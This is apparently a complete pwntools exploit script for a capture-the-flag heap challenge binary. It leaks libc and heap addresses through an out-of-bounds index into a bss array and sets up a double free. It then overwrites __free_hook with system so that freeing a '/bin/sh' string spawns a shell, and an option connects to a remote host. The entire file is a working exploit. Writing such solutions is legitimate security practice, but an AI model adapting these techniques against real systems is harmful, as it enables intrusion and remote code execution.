#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


def find(p, name):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(name)

def feed(p, index):
    # 0x6020a0(kittens@bss) + index * 8
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline(str(index))
    return p.recvline().strip(b": Meow!\n")

def free(p, index):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(str(index))

if __name__ == '__main__':
    context.terminal = ['tmux', 'sp', '-h']
    context.log_level = "debug"

    chall = "./chall"
    libc = ELF("./libc.so.6")
    elf = ELF(chall)
    context.binary = chall
    context.binary.checksec()

    if len(argv) >= 2 and argv[1] == "r":
        p = remote("example.com", 4444)
    elif len(argv) >= 2 and argv[1] == "d":
    	cmd = """
            #b *foster+119
    		c
            loadsym
    	"""
    	p = gdb.debug(chall,cmd)
    else:
        p = process(chall)

    # leak libc address
    name_bss_addr = elf.symbols['name']
    kittens_bss_addr = elf.symbols['kittens']
    log.info("name@bss: " + hex(name_bss_addr))
    log.info("kittens@bss: " + hex(kittens_bss_addr))
    leak_idx = int((name_bss_addr - kittens_bss_addr) / 8)
    find(p, p64(elf.got['free']))
    leak = u64(feed(p, leak_idx).ljust(8, b"\00"))
    log.info("free@libc: " + hex(leak))
    libc_base = leak - libc.symbols['free']
    log.info("libc base: " + hex(libc_base))
    # leak chunk address
    find(p, p64(kittens_bss_addr))
    chunk_addr = u64(feed(p, leak_idx).ljust(8, b"\00"))
    log.info("chunk(index=0): " + hex(chunk_addr))
    # double free
    find(p, p64(chunk_addr))
    free(p, 0)
    free(p, leak_idx)# kittens[leak_idx] == kittens[0]
    # get a shell !
    find(p, p64(libc.symbols['__free_hook'] + libc_base))
    find(p, "DUMMY")
    find(p, p64(libc.symbols['system'] + libc_base))
    find(p, "/bin/sh")
    free(p, 4)


    p.interactive()
